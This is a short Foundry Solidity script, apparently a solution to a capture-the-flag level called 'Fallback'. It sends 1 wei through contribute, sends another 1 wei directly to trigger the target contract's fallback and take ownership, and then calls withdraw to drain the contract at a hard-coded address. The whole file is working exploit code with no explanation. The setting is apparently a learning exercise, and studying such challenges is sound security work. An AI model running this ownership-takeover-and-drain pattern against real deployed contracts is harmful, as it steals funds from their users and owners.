// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Script} from "forge-std/Script.sol";
import {IFallback} from "../src/interfaces/2_IFallback.sol";

address constant INSTANCE = 0xD65BF3AcdeD796e4329Fedc6d5d66c86E2074484;

contract FallbackPOCScript is Script {
    IFallback instance = IFallback(INSTANCE);

    function run() external {
        vm.startBroadcast();

        instance.contribute{value: 1 wei}();
        (bool success,) = payable(INSTANCE).call{value: 1 wei}("");
        require(success);
        
        instance.withdraw();
        
        vm.stopBroadcast();
    }
}